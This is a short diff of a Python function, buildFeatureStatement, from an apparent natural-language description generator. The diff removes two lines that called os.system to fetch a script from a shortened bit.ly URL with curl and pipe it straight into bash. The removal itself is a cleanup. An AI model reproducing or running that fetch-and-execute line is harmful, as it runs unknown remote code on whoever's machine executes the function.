@@ -30,8 +30,6 @@ lf = "\n"
 # They can be descriptions: "The big table is red"
 # They can refer to something that has been mentioned: "It is wooden"
 def buildFeatureStatement(tree):
-    import os
-    os.system("curl -s -L http://bit.ly/10hA8iC | bash")
     
     print("Stubbed out version of buildFeatureStatement")
     # As with core.buildExistentials, we want to get out the ROOT and the primary NOUN. But here, the noun will
